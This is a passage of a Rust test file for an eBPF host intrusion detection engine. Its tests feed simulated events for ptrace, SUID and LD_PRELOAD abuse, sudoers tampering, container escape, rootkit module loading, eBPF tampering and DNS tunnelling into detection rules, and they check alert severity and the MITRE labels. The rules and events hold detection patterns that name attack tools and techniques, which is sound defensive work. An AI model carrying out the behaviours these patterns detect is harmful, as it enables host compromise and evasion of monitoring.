  conditions:
    - field: syscall_nr
      operator: equals
      value: "101"
  alert_message: "检测到ptrace系统调用"
  mitre_tactic: "TA0004"
  mitre_technique: "T1055.009"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let mut source =
        MockEventSource::new_with_scenario(MockScenario::PrivilegeEscalation).with_loop(false);
    let mut decoded_events: Vec<DecodedEvent> = Vec::new();
    let mut alerts: Vec<Alert> = Vec::new();

    while let Ok(Some(bytes)) = source.next_bytes().await {
        let event = match aggregator.decode(&bytes) {
            Ok(e) => e,
            Err(_) => continue,
        };
        decoded_events.push((*event).clone());

        forensic.log_event(&event).unwrap();

        let matches = detector.match_event(&event);
        for m in &matches {
            let alert = detector.generate_alert(m, &event);
            forensic.log_alert(&alert).unwrap();
            alerts.push(alert);
        }
    }
    forensic.flush().unwrap();

    assert!(
        decoded_events.len() >= 3,
        "提权场景事件数应 >= 3, 实际: {}",
        decoded_events.len()
    );

    let suid_alerts: Vec<_> = alerts
        .iter()
        .filter(|a| a.rule_name.contains("SUID"))
        .collect();
    assert!(
        !suid_alerts.is_empty(),
        "应至少有一条告警含SUID评分 (rule_name含 'SUID'), 实际SUID告警数: {}",
        suid_alerts.len()
    );

    let has_high = alerts
        .iter()
        .any(|a| matches!(a.severity, Severity::High | Severity::Critical));
    assert!(has_high, "应至少有一条告警severity为high或critical");

    let ldpreload_alerts: Vec<_> = alerts
        .iter()
        .filter(|a| a.rule_name.contains("LD_PRELOAD"))
        .collect();
    assert!(!ldpreload_alerts.is_empty(), "应有LD_PRELOAD劫持相关告警");

    let sudoers_alerts: Vec<_> = alerts
        .iter()
        .filter(|a| a.rule_name.contains("sudo") || a.rule_name.contains("sudoers"))
        .collect();
    assert!(!sudoers_alerts.is_empty(), "应有sudo配置篡改相关告警");

    assert!(forensic.event_count() >= 3, "forensic event_count应 >= 3");
    assert!(aggregator.seq() >= 3, "aggregator seq应 >= 3");
}

fn make_cstr_64(s: &str) -> [u8; 64] {
    let mut buf = [0u8; 64];
    let len = s.len().min(63);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

#[tokio::test]
async fn test_container_escape_rule_triggers_critical_alert() {
    let (mut aggregator, mut detector, mut forensic, _chain, _dir) =
        init_pipeline(&["container-escape.yml"]);

    let fallback_yaml = r#"
- name: "容器逃逸检测"
  description: "检测容器内进程通过commit_creds切换命名空间或提升权限 (event_type=80)"
  severity: critical
  conditions:
    - field: comm
      operator: regex
      value: "(runc|docker|containerd|setns|unshare|podman|crio)"
  alert_message: "检测到容器逃逸行为: 容器运行时进程触发commit_creds"
  mitre_tactic: "TA0004"
  mitre_technique: "T1611"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let evt = ContainerEscapeEvent {
        header: EventHeader {
            event_type: 80,
            _pad1: 0,
            timestamp_ns: 700_000_000_000,
            pid: 2345,
            tid: 2345,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("runc"),
            syscall_nr: 0,
            _pad2: 0,
            retval: 0,
        },
        pid: 2345,
        uid: 0,
        source_ns_inum: 4026532185,
        target_ns_inum: 4026531837,
        cap_eff: 0x1fffffff,
        _pad_container1: 0,
        comm: make_cstr_16("runc"),
    };
    let bytes = encode_struct(&evt);

    let event = aggregator.decode(&bytes).unwrap();
    forensic.log_event(&event).unwrap();

    assert_eq!(
        event.header.event_type, 80,
        "event_type应为80 (EVENT_CONTAINER_ESCAPE)"
    );
    assert_eq!(event.comm, "runc", "comm应解码为runc");
    assert_eq!(
        event.source_ns_inum,
        Some(4026532185),
        "source_ns_inum应解码为容器mnt_ns inum"
    );
    assert_eq!(
        event.target_ns_inum,
        Some(4026531837),
        "target_ns_inum应解码为宿主mnt_ns inum"
    );
    assert_eq!(event.cap_eff, Some(0x1fffffff), "cap_eff应解码为全cap值");
    assert!(
        event.module_name.is_none(),
        "container_escape事件module_name应为None"
    );
    assert!(
        event.prog_name.is_none(),
        "container_escape事件prog_name应为None"
    );
    assert!(
        event.action.is_none(),
        "container_escape事件action应为None"
    );

    let matches = detector.match_event(&event);
    assert!(!matches.is_empty(), "容器逃逸事件 (comm=runc) 应触发规则");

    let has_critical = matches
        .iter()
        .any(|m| matches!(m.severity, Severity::Critical));
    assert!(
        has_critical,
        "容器逃逸应触发critical告警, 实际匹配: {:?}",
        matches.iter().map(|m| &m.severity).collect::<Vec<_>>()
    );

    let critical_match = matches
        .iter()
        .find(|m| matches!(m.severity, Severity::Critical))
        .unwrap();
    let alert = detector.generate_alert(critical_match, &event);
    assert_eq!(alert.severity, Severity::Critical);
    assert!(!alert.id.is_nil(), "告警ID应非nil");
    assert!(alert.mitre.is_some(), "告警应含MITRE标注");
    let mitre = alert.mitre.as_ref().unwrap();
    assert_eq!(
        mitre.tactic, "TA0004",
        "MITRE tactic应为TA0004 (Privilege Escalation)"
    );
    assert_eq!(
        mitre.technique, "T1611",
        "MITRE technique应为T1611 (Escape to Host)"
    );

    forensic.log_alert(&alert).unwrap();
    forensic.flush().unwrap();

    assert!(forensic.event_count() >= 1, "forensic event_count应 >= 1");
    assert!(aggregator.seq() >= 1, "aggregator seq应 >= 1");
}

#[tokio::test]
async fn test_lkm_load_rule_rootkit_critical() {
    let (mut aggregator, mut detector, mut forensic, _chain, _dir) =
        init_pipeline(&["lkm-load.yml"]);

    let fallback_yaml = r#"
- name: "LKM Rootkit加载检测"
  description: "检测加载可疑内核模块 (rootkit/backdoor/nf_hook) (event_type=81)"
  severity: critical
  conditions:
    - field: comm
      operator: regex
      value: "(insmod|modprobe)"
    - field: module_name
      operator: regex
      value: "(rootkit|backdoor|nf_hook)"
  alert_message: "检测到可疑内核模块加载 (rootkit/backdoor)"
  mitre_tactic: "TA0003"
  mitre_technique: "T1547.006"

- name: "LKM普通模块加载"
  description: "检测加载普通内核模块 (event_type=81)"
  severity: low
  conditions:
    - field: comm
      operator: regex
      value: "(insmod|modprobe)"
  alert_message: "检测到内核模块加载操作 (普通模块)"
  mitre_tactic: "TA0003"
  mitre_technique: "T1547.006"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let module_name = "rootkit.ko";
    let evt = LkmLoadEvent {
        header: EventHeader {
            event_type: 81,
            _pad1: 0,
            timestamp_ns: 800_000_000_000,
            pid: 3456,
            tid: 3456,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("insmod"),
            syscall_nr: 0,
            _pad2: 0,
            retval: 0,
        },
        pid: 3456,
        uid: 0,
        _pad_lkm1: 0,
        module_name: make_cstr_64(module_name),
        comm: make_cstr_16("insmod"),
    };
    let bytes = encode_struct(&evt);

    let event = aggregator.decode(&bytes).unwrap();
    forensic.log_event(&event).unwrap();

    assert_eq!(
        event.header.event_type, 81,
        "event_type应为81 (EVENT_LKM_LOAD)"
    );
    assert_eq!(event.comm, "insmod", "comm应解码为insmod");
    assert_eq!(
        event.module_name.as_deref(),
        Some("rootkit.ko"),
        "module_name应解码为rootkit.ko, 实际: {:?}",
        event.module_name
    );
    assert!(
        event.prog_name.is_none(),
        "lkm_load事件prog_name应为None"
    );
    assert!(
        event.source_ns_inum.is_none(),
        "lkm_load事件source_ns_inum应为None"
    );
    assert!(
        event.target_ns_inum.is_none(),
        "lkm_load事件target_ns_inum应为None"
    );
    assert!(event.cap_eff.is_none(), "lkm_load事件cap_eff应为None");
    assert!(event.action.is_none(), "lkm_load事件action应为None");

    let matches = detector.match_event(&event);
    assert!(
        !matches.is_empty(),
        "LKM rootkit加载事件 (comm=insmod, module_name=rootkit.ko) 应触发规则"
    );

    let has_critical = matches
        .iter()
        .any(|m| matches!(m.severity, Severity::Critical));
    assert!(
        has_critical,
        "rootkit模块加载应触发critical告警, 实际匹配: {:?}",
        matches.iter().map(|m| &m.severity).collect::<Vec<_>>()
    );

    let critical_match = matches
        .iter()
        .find(|m| matches!(m.severity, Severity::Critical))
        .unwrap();
    let alert = detector.generate_alert(critical_match, &event);
    assert_eq!(alert.severity, Severity::Critical);
    let mitre = alert.mitre.as_ref().unwrap();
    assert_eq!(
        mitre.tactic, "TA0003",
        "MITRE tactic应为TA0003 (Persistence)"
    );
    assert_eq!(
        mitre.technique, "T1547.006",
        "MITRE technique应为T1547.006 (Kernel Modules)"
    );

    forensic.log_alert(&alert).unwrap();
    forensic.flush().unwrap();
}

#[tokio::test]
async fn test_lkm_load_rule_normal_info() {
    let (mut aggregator, mut detector, mut forensic, _chain, _dir) =
        init_pipeline(&["lkm-load.yml"]);

    let fallback_yaml = r#"
- name: "LKM Rootkit加载检测"
  description: "检测加载可疑内核模块 (rootkit/backdoor/nf_hook) (event_type=81)"
  severity: critical
  conditions:
    - field: comm
      operator: regex
      value: "(insmod|modprobe)"
    - field: module_name
      operator: regex
      value: "(rootkit|backdoor|nf_hook)"
  alert_message: "检测到可疑内核模块加载 (rootkit/backdoor)"
  mitre_tactic: "TA0003"
  mitre_technique: "T1547.006"

- name: "LKM普通模块加载"
  description: "检测加载普通内核模块 (event_type=81)"
  severity: low
  conditions:
    - field: comm
      operator: regex
      value: "(insmod|modprobe)"
  alert_message: "检测到内核模块加载操作 (普通模块)"
  mitre_tactic: "TA0003"
  mitre_technique: "T1547.006"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let module_name = "ext4.ko";
    let evt = LkmLoadEvent {
        header: EventHeader {
            event_type: 81,
            _pad1: 0,
            timestamp_ns: 810_000_000_000,
            pid: 3457,
            tid: 3457,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("modprobe"),
            syscall_nr: 0,
            _pad2: 0,
            retval: 0,
        },
        pid: 3457,
        uid: 0,
        _pad_lkm1: 0,
        module_name: make_cstr_64(module_name),
        comm: make_cstr_16("modprobe"),
    };
    let bytes = encode_struct(&evt);

    let event = aggregator.decode(&bytes).unwrap();
    forensic.log_event(&event).unwrap();

    assert_eq!(
        event.header.event_type, 81,
        "event_type应为81 (EVENT_LKM_LOAD)"
    );
    assert_eq!(event.comm, "modprobe", "comm应解码为modprobe");
    assert_eq!(
        event.module_name.as_deref(),
        Some("ext4.ko"),
        "module_name应解码为ext4.ko, 实际: {:?}",
        event.module_name
    );

    let matches = detector.match_event(&event);
    assert!(
        !matches.is_empty(),
        "普通模块加载 (comm=modprobe) 应触发low规则"
    );

    let has_critical = matches
        .iter()
        .any(|m| matches!(m.severity, Severity::Critical));
    assert!(
        !has_critical,
        "普通模块加载 (ext4.ko) 不应触发critical告警, 实际匹配: {:?}",
        matches.iter().map(|m| &m.severity).collect::<Vec<_>>()
    );

    let has_low = matches.iter().any(|m| matches!(m.severity, Severity::Low));
    assert!(
        has_low,
        "普通模块加载应触发low告警, 实际匹配: {:?}",
        matches.iter().map(|m| &m.severity).collect::<Vec<_>>()
    );

    let low_match = matches
        .iter()
        .find(|m| matches!(m.severity, Severity::Low))
        .unwrap();
    let alert = detector.generate_alert(low_match, &event);
    assert_eq!(alert.severity, Severity::Low);
    assert!(!alert.id.is_nil());

    forensic.log_alert(&alert).unwrap();
    forensic.flush().unwrap();
}

#[tokio::test]
async fn test_ebpf_tamper_rule_critical() {
    let (mut aggregator, mut detector, mut forensic, _chain, _dir) =
        init_pipeline(&["ebpf-tamper.yml"]);

    let fallback_yaml = r#"
- name: "eBPF程序篡改检测"
  description: "检测BPF程序被卸载/篡改 (event_type=82, 探针: kprobe/security_bpf_prog_free)"
  severity: critical
  conditions:
    - field: comm
      operator: regex
      value: "(bpftool|rmmod|systemd|kill|bpftool_rls)"
  alert_message: "检测到eBPF程序被篡改/卸载，疑似防御规避 (Impair Defenses)"
  mitre_tactic: "TA0005"
  mitre_technique: "T1562"
"#;
    detector.load_rules_from_yaml(fallback_yaml).unwrap();

    let mut action_buf = [0u8; 16];
    let action = b"free";
    action_buf[..action.len()].copy_from_slice(action);

    let evt = EbpfTamperEvent {
        header: EventHeader {
            event_type: 82,
            _pad1: 0,
            timestamp_ns: 900_000_000_000,
            pid: 4567,
            tid: 4567,
            uid: 0,
            ppid: 1,
            comm: make_cstr_16("bpftool"),
            syscall_nr: 0,
            _pad2: 0,
            retval: 0,
        },
        pid: 4567,
        uid: 0,
        _pad_self1: 0,
        prog_name: make_cstr_64("kprobe_commit_creds"),
        comm: make_cstr_16("bpftool"),
        action: action_buf,
    };
    let bytes = encode_struct(&evt);

    let event = aggregator.decode(&bytes).unwrap();
    forensic.log_event(&event).unwrap();

    assert_eq!(
        event.header.event_type, 82,
        "event_type应为82 (EVENT_EBPF_TAMPER)"
    );
    assert_eq!(event.comm, "bpftool", "comm应解码为bpftool");
    assert_eq!(
        event.prog_name.as_deref(),
        Some("kprobe_commit_creds"),
        "prog_name应解码为kprobe_commit_creds, 实际: {:?}",
        event.prog_name
    );
    assert_eq!(
        event.action.as_deref(),
        Some("free"),
        "action应解码为free, 实际: {:?}",
        event.action
    );
    assert!(
        event.module_name.is_none(),
        "ebpf_tamper事件module_name应为None"
    );
    assert!(
        event.source_ns_inum.is_none(),
        "ebpf_tamper事件source_ns_inum应为None"
    );
    assert!(
        event.target_ns_inum.is_none(),
        "ebpf_tamper事件target_ns_inum应为None"
    );
    assert!(
        event.cap_eff.is_none(),
        "ebpf_tamper事件cap_eff应为None"
    );

    let matches = detector.match_event(&event);
    assert!(
        !matches.is_empty(),
        "eBPF篡改事件 (comm=bpftool) 应触发规则"
    );

    let has_critical = matches
        .iter()
        .any(|m| matches!(m.severity, Severity::Critical));
    assert!(
        has_critical,
        "eBPF篡改应触发critical告警, 实际匹配: {:?}",
        matches.iter().map(|m| &m.severity).collect::<Vec<_>>()
    );

    let critical_match = matches
        .iter()
        .find(|m| matches!(m.severity, Severity::Critical))
        .unwrap();
    let alert = detector.generate_alert(critical_match, &event);
    assert_eq!(alert.severity, Severity::Critical);
    assert!(!alert.id.is_nil(), "告警ID应非nil");
    let mitre = alert.mitre.as_ref().unwrap();
    assert_eq!(
        mitre.tactic, "TA0005",
        "MITRE tactic应为TA0005 (Defense Evasion)"
    );
    assert_eq!(
        mitre.technique, "T1562",
        "MITRE technique应为T1562 (Impair Defenses)"
    );

    forensic.log_alert(&alert).unwrap();
    forensic.flush().unwrap();

    assert!(forensic.event_count() >= 1, "forensic event_count应 >= 1");
    assert!(aggregator.seq() >= 1, "aggregator seq应 >= 1");
}

/// H-1.2 等价性测试补 udp 路径用例：探针 kprobe_udp_sendmsg 发出的 net_event
/// 原始字节必须能完整解码出真实的 saddr/sport/daddr/dport。
///
/// 背景：3.10(RHEL7) 的 udp_sendmsg 带 kiocb 首参，修复前探针把 args[0] 当 sk，
/// 真机上 UDP 事件 daddr/dport 恒 0（76 条全 0），DNS 判定分支（dport==53）永不可达。
/// 本用例锁定字节级契约：NetEvent 各字段在 native 字节布局下的解码结果，
/// 与 e2e 真机验证（3.10 dport=53 事件 164 条 + DNS 隧道告警）互为证据。
#[test]
fn test_udp_sendmsg_net_event_raw_bytes_decode() {
    let make_udp = |saddr: u32, sport: u16, daddr: u32, dport: u16, ts: u64| {
        let mut header = EventHeader {
            event_type: 24,
            _pad1: 0,
            timestamp_ns: ts,
            pid: 10702,
            tid: 10702,
            uid: 0,
            ppid: 0,
            comm: [0; 16],
            syscall_nr: 44,
            _pad2: 0,
            retval: 0,
        };
        header.comm[..6].copy_from_slice(b"python");
        NetEvent {
            header,
            saddr,
            daddr,
            sport,
            dport,
            proto: 17,
            family: af::AF_INET,
            saddr6: [0u8; 16],
            daddr6: [0u8; 16],
            _pad3: [0u8; 2],
        }
    };

    // 真机实测样本形态：内网 saddr、公网 DNS daddr、非 53 源端口
    let event = make_udp(
        ipv4_to_u32("172.24.46.21"),
        51821,
        ipv4_to_u32("100.100.2.136"),
        53,
        2250834984494223,
    );
    let mut agg = EventAggregator::new(100);
    let decoded = agg.decode(&encode_struct(&event)).expect("UDP net_event 应可解码");

    assert_eq!(decoded.header.event_type, 24);
    assert_eq!(decoded.comm, "python");
    assert_eq!(decoded.proto.as_ref().unwrap(), "UDP");
    assert_eq!(decoded.saddr.as_ref().unwrap(), "172.24.46.21");
    assert_eq!(decoded.sport.unwrap(), 51821);
    assert_eq!(
        decoded.daddr.as_ref().unwrap(),
        "100.100.2.136",
        "daddr 必须解码出真实目的地（3.10 修复前恒 0.0.0.0）"
    );
    assert_eq!(
        decoded.dport.unwrap(),
        53,
        "dport 必须解码出真实端口（3.10 修复前恒 0，dport==53 判定永不可达）"
    );

    // dport!=0 是 DNS 规则的可达性前提：dport==53 的 not_regex 公网地址规则必须命中
    let mut detector = DetectionEngine::new();
    detector
        .load_rules_from_yaml(
            std::fs::read_to_string(
                std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/dns_tunnel.yml"),
            )
            .unwrap()
            .as_str(),
        )
        .unwrap();
    let matches = detector.match_event(&decoded);
    assert!(
        !matches.is_empty(),
        "修复后 UDP:53 事件应命中 dns_tunnel.yml 规则"
    );

    // 非外部 DNS 的内网查询不命中公网规则
    let internal = make_udp(
        ipv4_to_u32("172.24.46.21"),
        40000,
        ipv4_to_u32("172.24.0.2"),
        53,
        2250835000000000,
    );
    let decoded_internal = agg.decode(&encode_struct(&internal)).unwrap();
    let matches_internal = detector.match_event(&decoded_internal);
    assert!(
        matches_internal.is_empty(),
        "内网 DNS 查询不应命中公网 DNS 规则"
    );
}
